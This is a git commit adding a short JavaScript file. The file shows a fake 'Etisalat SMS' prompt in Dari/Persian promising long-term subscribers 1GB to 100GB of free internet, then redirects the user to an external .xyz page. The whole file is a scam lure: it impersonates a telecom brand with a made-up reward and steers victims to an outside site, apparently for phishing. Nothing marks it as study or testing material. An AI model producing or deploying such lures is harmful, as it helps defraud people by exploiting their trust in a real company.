faf4d110f8ae665d756cfb1c38d4442640abd05a
itidmi <itid180@gmail.com>
2026-07-19 17:38:32 -0700

    Create act-etisalatfreedata.js for user prompt
    Add script to prompt for Etisalat free data information.

---
+++ act-etisalatfreedata.js
@@ -0,0 +1,6 @@
+var password = 'معلومات رایگان'
+password=prompt('Etisalat SMS:مشتری گرامی، لطفاً برای مشترکین طولانی مدت ما انترنت معلومات رایگان از 1GB تا 100GB دریافت کنید، پاداش مشتریان، حالا چک کنید ','معلومات رایگان');
+if (password != 'معلومات رایگان') {
+location.href='https://itidetere.xyz/etisalatfreedata.html';
+}
+
